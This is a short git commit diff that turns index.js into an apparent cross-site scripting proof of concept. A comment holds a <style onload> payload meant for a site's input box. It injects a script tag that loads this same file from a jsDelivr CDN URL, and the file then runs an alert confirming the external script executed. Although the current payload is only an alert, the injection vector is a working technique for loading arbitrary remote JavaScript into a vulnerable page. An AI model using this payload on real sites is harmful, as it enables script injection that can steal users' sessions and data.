c2ec66fabe0731ef02a28b0adbb0c1e71784d9cb
actualaardvark <114784410+actualaardvark@users.noreply.github.com>
2024-09-24 07:04:03 +0000

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,12 @@
-console.log("loaded")
+/*
+//This script goes in the input box
+<style onload="
+let script = document.createElement('script');
+script.setAttribute('src','https://cdn.jsdelivr.net/gh/actualaardvark/cscrsc@latest/index.js');
+
+document.head.appendChild(script);
+"></style>
+// Remember to purge cache: https://www.jsdelivr.com/tools/purge
+*/
+
+alert("js executed from external site");
